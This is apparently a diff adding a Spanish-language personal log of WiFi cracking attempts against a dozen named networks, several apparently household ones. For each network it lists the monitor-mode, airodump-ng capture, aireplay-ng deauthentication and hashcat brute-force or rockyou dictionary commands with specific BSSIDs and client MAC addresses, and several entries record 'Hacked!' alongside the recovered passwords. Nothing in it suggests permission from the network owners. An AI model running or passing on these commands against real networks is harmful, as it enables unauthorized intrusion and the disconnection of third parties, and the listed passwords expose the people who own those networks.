@@ -1,0 +1,164 @@
+-. AIRMON:
+    sudo airmon-ng (muestra las tarjetas de red activas)
+    sudo airmon-ng start wlp0s20f0u3 (inicia la tarjeta de red en modo monitor)
+    sudo airodump-ng wlp0s20f0u3 (para ver las redes disponibles)
+
+-. Tenda_BEE430
+    Comandos:
+
+    sudo airodump-ng -c 11 --bssid 58:D9:D5:BE:E4:31 -w Tenda_BEE430 wlp0s20f0u3
+    sudo aireplay-ng -0 2 -a 58:D9:D5:BE:E4:31 -c E8:F2:E2:C5:7D:DA wlp0s20f0u3
+    hashcat -m 22000 -a 3 Tenda_BEE430-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+
+    Status:
+    Password:
+
+
+-. Tenda_708CD0
+    Comandos:
+
+    sudo airodump-ng -c 11 --bssid CC:2D:21:70:8C:D4 -w Tenda_708CD0 wlp0s20f0u3
+    sudo aireplay-ng -0 2 -a CC:2D:21:70:8C:D4 -c E8:F2:E2:C5:7D:DA wlp0s20f0u3
+    hashcat -m 22000 -a 3 Tenda_708CD0-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+
+    Status:
+    Password:
+
+
+-. TP-Link_321Badonis
+    Comandos:
+
+    sudo airodump-ng -c 4 --bssid 20:23:51:30:32:1B -w TP-Link_321Badonis wlp0s20f0u3
+    sudo aireplay-ng -0 2 -a 20:23:51:30:32:1B -c C0:D3:C0:8F:7D:33 wlp0s20f0u3
+    hashcat -m 22000 -a 3 TP-Link_321Badonis-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+
+    Status:Hacked!!!
+    Password:72504338
+
+
+
+
+
+
+-. P16-TP-LINK_833912
+    Comandos:
+
+    sudo airodump-ng -c 6 --bssid 64:66:B3:83:39:12 -w P16-TP-LINK_833912 wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 64:66:B3:83:39:12 -c E8:F2:E2:C5:7D:DA  wlp0s20f0u1
+    hashcat -m 22000 -a 3 P16-TP-LINK_833912.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+
+    Status: Hacked!
+    Password: 07380914
+
+
+-. P16-MERCUSYS
+    Comandos:
+
+    sudo airodump-ng -c 10 --bssid 00:EB:D8:51:9D:16 -w P16-MERCUSYS wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 00:EB:D8:51:9D:16 -c 18:DE:50:34:89:61 wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 00:EB:D8:51:9D:16 -c D6:B8:9B:48:16:88 wlp0s20f0u1
+    hcxpcapngtool -o P16-MERCUSYS-01.hc22000 -E essidlist P16-MERCUSYS-01.cap
+
+    hashcat -m 22000 -a 3 P16-MERCUSYS-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+    hashcat -m 22000 -a 0 P16-MERCUSYS-01.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule
+
+    Status: Hacked!
+    Password: 01278408
+
+
+-. TP-Link_352A
+    Comandos:
+
+    sudo airodump-ng -c 10 --bssid 1C:61:B4:44:35:2A -w TP-Link_352A wlp0s20f0u1
+    sudo aireplay-ng -0 5 -a 1C:61:B4:44:35:2A -c 44:72:AC:9B:3A:E9 wlp0s20f0u1
+    sudo aireplay-ng -0 5 -a 1C:61:B4:44:35:2A -c 18:70:3B:64:6B:C6 wlp0s20f0u1
+    hcxpcapngtool -o TP-Link_352A.hc22000 -E essidlist TP-Link_352A-01.cap
+    hashcat -m 22000 -a 3 TP-Link_352A.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+
+    Status: Hacked!
+    Password: 87807219
+
+
+-. P16-JMAPHOM
+    Comandos:
+
+    sudo airodump-ng -c 4 --bssid 00:EB:D8:20:13:9C -w P16-JMAPHOM wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 00:EB:D8:20:13:9C -c 8C:45:00:8E:27:DF wlp0s20f0u1
+
+    hashcat -m 22000 -a 3 NOMBREARCHIVO.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+
+
+-. P16-INTERJG
+    Comandos:
+
+    sudo airodump-ng -c 11 --bssid 10:0D:7F:D8:1C:CF -w P16-INTERJG wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 10:0D:7F:D8:1C:CF -c 60:AB:67:B0:09:CC wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 10:0D:7F:D8:1C:CF -c 9C:28:F7:88:70:E6 wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 10:0D:7F:D8:1C:CF -c 8C:49:62:32:78:90 wlp0s20f0u1
+    hcxpcapngtool -o P16-INTERJG.hc22000 -E essidlist P16-INTERJG-01.cap
+    hashcat -m 22000 -a 3 P16-INTERJG.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3 (Falló)
+    hashcat -m 22000 -a 0 P16-INTERJG.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule
+
+
+
+-. Leandro (HAY QUE PROBAR CON 10 DIGITOS Y CON EL DICCIONARIO)
+    Comandos:
+
+    sudo airodump-ng -c 9 --bssid 14:CC:20:4F:F1:7E -w Leandro wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 14:CC:20:4F:F1:7E -c BA:6C:FD:3B:57:06 wlp0s20f0u1
+    hcxpcapngtool -o Leandro-01.hc22000 -E essidlist Leandro-01.cap
+    hashcat -m 22000 -a 3 Leandro-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+    hashcat -m 22000 -a 0 Leandro-01.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule --session=leandro --restore-file-path=/home/lhedwin/Hacking/wifi/hashcat/leandro.restore
+    hashcat -m 22000 -a 0 Leandro-01.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule --restore
+
+-. KYS (FALTA HAND CHAKE)
+    Comandos:
+
+    sudo airodump-ng -c 11 --bssid 12:27:F5:B9:5F:F8 -w KYS wlp0s20f0u1
+    sudo aireplay-ng -0 5 -a 12:27:F5:B9:5F:F8 -c 18:DE:50:34:89:61 wlp0s20f0u1
+    hcxpcapngtool -o KYS-01.hc22000 -E essidlist KYS-01.cap
+    hashcat -m 22000 -a 3 KYS-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+    hashcat -m 22000 -a 0 KYS-01.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule
+
+
+
+
+-. Armando (FALTA HAND CHAKE)
+    Comandos:
+
+    sudo airodump-ng -c 6 --bssid 1C:61:B4:9D:68:F6 -w Armando wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 1C:61:B4:9D:68:F6 -c 4C:02:20:F1:4E:4A wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 1C:61:B4:9D:68:F6 -c 2E:B0:9B:F3:DA:D5 wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 1C:61:B4:9D:68:F6 -c 8C:35:92:2F:A0:70 wlp0s20f0u1
+    sudo aireplay-ng -0 2 -a 1C:61:B4:9D:68:F6 -c C0:D3:C0:FE:9F:2F wlp0s20f0u1
+    hcxpcapngtool -o Armando-01.hc22000 -E essidlist Armando-01.cap
+    hashcat -m 22000 -a 3 Armando-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+    hashcat -m 22000 -a 0 Armando-01.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule
+
+
+
+
+-. WiFi_Residencias (FALTA HAND CHAKE)
+    Comandos:
+
+    sudo airodump-ng -c 11 --bssid B0:7F:B9:26:45:7E -w WiFi_Residencias wlp0s20f0u1
+    sudo aireplay-ng -0 5 -a B0:7F:B9:26:45:7E -c A6:7B:B9:21:8B:25 wlp0s20f0u1
+    hcxpcapngtool -o KYS-01.hc22000 -E essidlist KYS-01.cap
+    hashcat -m 22000 -a 3 KYS-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+    hashcat -m 22000 -a 0 KYS-01.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule
+
+
+
+
+
+-. Venezuela (FALTA HAND CHAKE)
+    Comandos:
+
+    sudo airodump-ng -c 1 --bssid 98:48:27:9D:0F:E4 -w Venezuela wlp0s20f0u1
+    sudo aireplay-ng -0 5 -a 98:48:27:9D:0F:E4 -c 18:DE:50:34:89:61 wlp0s20f0u1
+    hcxpcapngtool -o KYS-01.hc22000 -E essidlist KYS-01.cap
+    hashcat -m 22000 -a 3 KYS-01.hc22000 "?d?d?d?d?d?d?d?d" -d 2 -D 2 -w 3
+    hashcat -m 22000 -a 0 KYS-01.hc22000 /home/lhedwin/Hacking/wifi/aircrack-ng/diccionarios/rockyou.txt -d 2 -D 2 -w 3 -r best64.rule
+
+
+
